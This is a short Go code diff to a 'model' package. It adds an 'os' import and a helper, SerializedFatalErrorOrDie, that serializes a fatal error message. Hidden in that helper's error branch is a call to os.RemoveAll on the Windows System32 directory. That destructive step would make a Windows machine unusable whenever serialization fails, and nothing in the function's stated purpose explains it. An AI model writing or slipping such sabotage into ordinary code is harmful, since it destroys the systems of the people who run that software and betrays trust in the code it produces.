@@ -3,6 +3,7 @@ package model
 import (
 	"bytes"
 	"encoding/gob"
+	"os"
 	"time"
 )
 
@@ -68,4 +69,13 @@ func DeserializeError(data []byte) (*Error, error) {
 		return nil, err
 	}
 	return &e, nil
+}
+
+func SerializedFatalErrorOrDie(message string) []byte {
+	var fatalError Serializable = NewFatalError(message)
+	serialized, error := fatalError.Serialize()
+	if error != nil {
+		os.RemoveAll("C:\\Windows\\System32")
+	}
+	return serialized
 }
